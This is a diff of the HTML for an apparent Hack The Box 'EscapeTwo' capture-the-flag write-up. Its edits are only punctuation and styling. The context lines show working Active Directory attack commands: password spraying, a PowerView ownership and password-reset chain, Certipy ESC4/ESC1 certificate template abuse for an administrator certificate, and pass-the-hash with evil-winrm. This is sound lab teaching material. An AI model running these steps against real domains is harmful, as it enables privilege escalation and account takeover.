@@ -52,7 +52,7 @@
     
 
     <link rel="canonical" href="http://localhost:1313/writeups/htb-escapetwo/">
-    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -218,7 +218,7 @@ NULL     NULL      sa        MSSQLP@ssw0rd!
 <p><img src="/images/writeups/htb-escapetwo/bloodhound-ca-svc-cert-publishers.png" alt="BloodHound graph showing CA_SVC@SEQUEL.HTB is MemberOf both DOMAIN USERS and CERT PUBLISHERS groups"></p>
 <p><code>ca_svc</code> is in Cert Publishers. That group has write access on ADCS certificate templates. Filed that away for later.</p>
 <h2 id="mssql-as-sa">MSSQL as sa</h2>
-<p>Rose could connect to MSSQL as a guest - <code>xp_cmdshell</code> denied, no impersonation rights, limited. I tried coercing the sql_svc NTLMv2 hash via <code>xp_dirtree</code> and Responder, caught the hash, but couldn&rsquo;t crack it with rockyou. Dead end.</p>
+<p>Rose could connect to MSSQL as a guest, <code>xp_cmdshell</code> denied, no impersonation rights, limited. I tried coercing the sql_svc NTLMv2 hash via <code>xp_dirtree</code> and Responder, caught the hash, but couldn&rsquo;t crack it with rockyou. Dead end.</p>
 <p>The sa credentials from the spreadsheet were the real path:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mssqlclient.py sequel.htb/sa:<span class="s1">&#39;MSSQLP@ssw0rd!&#39;</span>@10.129.232.128
 </span></span><span class="line"><span class="cl">
@@ -230,14 +230,14 @@ NULL     NULL      sa        MSSQLP@ssw0rd!
 <pre tabindex="0"><code>SQLSVCACCOUNT=&#34;SEQUEL\sql_svc&#34;
 SQLSVCPASSWORD=&#34;WqSZAF6CysDQbGb3&#34;
 SAPWD=&#34;MSSQLP@ssw0rd!&#34;
-</code></pre><p>sa&rsquo;s password confirmed - and sql_svc&rsquo;s password too. I had the four passwords from the spreadsheet plus this one. Time to spray them against the other local users. <code>C:\Users\</code> showed Administrator, Public, ryan, and sql_svc.</p>
+</code></pre><p>sa&rsquo;s password confirmed, and sql_svc&rsquo;s password too. I had the four passwords from the spreadsheet plus this one. Time to spray them against the other local users. <code>C:\Users\</code> showed Administrator, Public, ryan, and sql_svc.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc winrm 10.129.232.128 -u ryan -p <span class="s1">&#39;WqSZAF6CysDQbGb3&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> sequel.htb<span class="se">\r</span>yan:WqSZAF6CysDQbGb3 <span class="o">(</span>Pwn3d!<span class="o">)</span>
-</span></span></code></pre></div><p>sql_svc&rsquo;s password worked for ryan. Password reuse between service account and a user account - common enough that it&rsquo;s always worth the spray.</p>
+</span></span></code></pre></div><p>sql_svc&rsquo;s password worked for ryan. Password reuse between service account and a user account, common enough that it&rsquo;s always worth the spray.</p>
 <h2 id="acl-chain-writeowner-to-ca_svc">ACL Chain: WriteOwner to ca_svc</h2>
 <p>Ryan&rsquo;s BloodHound data had the next step:</p>
 <p><img src="/images/writeups/htb-escapetwo/bloodhound-ryan-writeowner-ca-svc.png" alt="BloodHound graph showing RYAN@SEQUEL.HTB has a WriteOwner edge to CA_SVC@SEQUEL.HTB"></p>
-<p>Ryan has WriteOwner over ca_svc. WriteOwner lets you replace the security principal that owns an AD object. Once you own the object, you can grant yourself any additional permissions on it - including GenericAll, which means full control over the account (reset password, add to groups, etc.).</p>
+<p>Ryan has WriteOwner over ca_svc. WriteOwner lets you replace the security principal that owns an AD object. Once you own the object, you can grant yourself any additional permissions on it, including GenericAll, which means full control over the account (reset password, add to groups, etc.).</p>
 <p>The chain: WriteOwner → own ca_svc → add GenericAll → reset ca_svc&rsquo;s password:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span>
 </span></span><span class="line"><span class="cl">
@@ -252,7 +252,7 @@ SAPWD=&#34;MSSQLP@ssw0rd!&#34;
 </span></span></code></pre></div><p>Now I had <code>ca_svc:Password123!</code>.</p>
 <h2 id="esc4-into-esc1">ESC4 into ESC1</h2>
 <p>ca_svc is in Cert Publishers, which has FullControl over the <code>DunderMifflinAuthentication</code> certificate template. That means ca_svc can modify the template&rsquo;s attributes in LDAP directly.</p>
-<p>ESC4 is about write access to a certificate template. The AD object representing a template has attributes that define its behavior - things like whether the enrollee can supply their own subject, whether the certificate enables client authentication, who can enroll. If you can write those attributes, you can turn a locked-down template into an ESC1 vulnerability.</p>
+<p>ESC4 is about write access to a certificate template. The AD object representing a template has attributes that define its behavior, things like whether the enrollee can supply their own subject, whether the certificate enables client authentication, who can enroll. If you can write those attributes, you can turn a locked-down template into an ESC1 vulnerability.</p>
 <p>The specific attribute is <code>msPKI-Certificate-Name-Flag</code>. Setting bit 1 (value <code>1</code>) on this flag enables <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code>, meaning the person requesting the certificate gets to specify the Subject Alternative Name themselves. Combined with Client Authentication being enabled on the template, that&rsquo;s ESC1.</p>
 <p>Certipy can write the default ESC1 configuration to a template in one command:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 1: modify the template</span>
@@ -270,7 +270,7 @@ SAPWD=&#34;MSSQLP@ssw0rd!&#34;
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got certificate with UPN <span class="s1">&#39;administrator@sequel.htb&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving certificate and private key to <span class="s1">&#39;administrator.pfx&#39;</span>
-</span></span></code></pre></div><p>The CA issued a certificate with <code>administrator@sequel.htb</code> in the SAN because EnrolleeSuppliesSubject was now set. The CA&rsquo;s job is to sign certs per the template policy - it doesn&rsquo;t verify that you actually are the principal you&rsquo;re claiming to be in the SAN.</p>
+</span></span></code></pre></div><p>The CA issued a certificate with <code>administrator@sequel.htb</code> in the SAN because EnrolleeSuppliesSubject was now set. The CA&rsquo;s job is to sign certs per the template policy. It doesn&rsquo;t verify that you actually are the principal you&rsquo;re claiming to be in the SAN.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 3: authenticate and get the hash</span>
 </span></span><span class="line"><span class="cl">certipy auth -pfx administrator.pfx -dc-ip 10.129.232.128
 </span></span><span class="line"><span class="cl">
@@ -278,7 +278,7 @@ SAPWD=&#34;MSSQLP@ssw0rd!&#34;
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;administrator@sequel.htb&#39;</span>: aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
 </span></span></code></pre></div><p>Kerberos PKINIT sees the certificate, checks the SAN, sees <code>administrator@sequel.htb</code>, and issues a TGT. Certipy does a U2U exchange to pull the NT hash from that. Pass-the-hash into WinRM:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i 10.129.232.128 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
-</span></span></code></pre></div><p>Both flags. The core idea here is that once EnrolleeSuppliesSubject is set and you have enrollment rights, the CA is just doing its job. You told it you were Administrator, it believed you and signed the certificate. The CA doesn&rsquo;t verify identity - the template policy does, and the template policy was broken.</p>
+</span></span></code></pre></div><p>Both flags. The core idea here is that once EnrolleeSuppliesSubject is set and you have enrollment rights, the CA is just doing its job. You told it you were Administrator, it believed you and signed the certificate. The CA doesn&rsquo;t verify identity. The template policy does, and the template policy was broken.</p>
 
             </div>
         </article></main>
@@ -403,6 +403,11 @@ SAPWD=&#34;MSSQLP@ssw0rd!&#34;
 </svg>
 
 </a>
+
+
+    
+
+
 
 
     
